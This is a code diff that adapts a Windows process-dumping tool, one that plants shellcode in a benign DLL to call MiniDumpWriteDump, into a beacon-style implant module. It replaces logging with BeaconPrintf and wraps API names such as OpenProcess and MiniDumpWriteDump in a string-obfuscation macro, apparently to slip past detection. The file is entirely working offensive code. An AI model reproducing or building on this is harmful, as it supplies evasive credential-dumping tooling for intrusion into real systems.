@@ -2,6 +2,7 @@
 // https://twitter.com/GabrielLandau
 
 #define _CRT_SECURE_NO_WARNINGS
+#include "beacon.h"
 #include "Payload.h"
 #include "DumpShellcode.h"
 #include "resource.h"
@@ -10,6 +11,7 @@
 #include <stdio.h>
 #include <DbgHelp.h>
 #include <string>
+#include "stringobf.h"
 
 // Builds a SHELLCODE_PARAMS struct so our payload can be smaller and simpler
 bool InitShellcodeParams(
@@ -23,7 +25,7 @@ bool InitShellcodeParams(
 
     if ((NULL == hKernel32) || (NULL == hNtdll))
     {
-        Log(Error, "Couldn't find kernel32/ntdll?  What?");
+        BeaconPrintf(CALLBACK_ERROR, OBF("Couldn't find kernel32/ntdll?  What?"));
         return false;
     }
 
@@ -34,23 +36,23 @@ bool InitShellcodeParams(
     pParams->dwTargetProcessId = dwTargetProcessId;
     if (wcslen(pDumpPath) >= _countof(pParams->dumpPath))
     {
-        Log(Error, "Dump path too long: %ws", pDumpPath);
+        BeaconPrintf(CALLBACK_ERROR, OBF("Dump path too long: %ws"), pDumpPath);
         return false;
     }
     wcsncpy(pParams->dumpPath, pDumpPath, _countof(pParams->dumpPath));
 
     // Strings (so we don't have to embed them in shellcode)
-    strncpy(pParams->szMiniDumpWriteDump, "MiniDumpWriteDump", _countof(pParams->szMiniDumpWriteDump));
+    strncpy(pParams->szMiniDumpWriteDump, OBF("MiniDumpWriteDump"), _countof(pParams->szMiniDumpWriteDump));
     wcsncpy(pParams->szDbgHelpDll, L"Dbghelp.dll", _countof(pParams->szDbgHelpDll));
 
     // IAT
     // Target process should already have kernel32 loaded, so we can just pass pointers over
-    pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, "LoadLibraryW");
-    pParams->pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, "GetProcAddress");
-    pParams->pOpenProcess = (OpenProcess_t)GetProcAddress(hKernel32, "OpenProcess");
-    pParams->pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, "CreateFileW");
-    pParams->pTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, "TerminateProcess");
-    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege");    
+    pParams->pLoadLibraryW = (LoadLibraryW_t)GetProcAddress(hKernel32, OBF("LoadLibraryW"));
+    pParams->pGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, OBF("GetProcAddress"));
+    pParams->pOpenProcess = (OpenProcess_t)GetProcAddress(hKernel32, OBF("OpenProcess"));
+    pParams->pCreateFileW = (CreateFileW_t)GetProcAddress(hKernel32, OBF("CreateFileW"));
+    pParams->pTerminateProcess = (TerminateProcess_t)GetProcAddress(hKernel32, OBF("TerminateProcess"));
+    pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, OBF("RtlAdjustPrivilege"));    
 
     if (!pParams->pLoadLibraryW || 
         !pParams->pGetProcAddress || 
@@ -59,7 +61,7 @@ bool InitShellcodeParams(
         !pParams->pTerminateProcess ||
         !pParams->pRtlAdjustPrivilege)
     {
-        Log(Error, "Failed to resolve a payload import");
+        BeaconPrintf(CALLBACK_ERROR, OBF("Failed to resolve a payload import"));
         return false;
     }
 
@@ -89,7 +91,7 @@ bool BuildPayload(
     if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
         (dwBytesRead != dllSize.QuadPart))
     {
-        Log(Error, "BuildPayload: ReadFile failed with GLE %u", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, OBF("BuildPayload: ReadFile failed with GLE %u"), GetLastError());
         return false;
     }
 
@@ -116,7 +118,7 @@ bool BuildPayload(
 
     if (&buf[buf.size() - 1] - (char*)pEntrypoint + bytesWritten < sizeof(params))
     {
-        Log(Error, "Not enough space for SHELLCODE_PARAMS");
+        BeaconPrintf(CALLBACK_ERROR, OBF("Not enough space for SHELLCODE_PARAMS"));
         return false;
     }
 
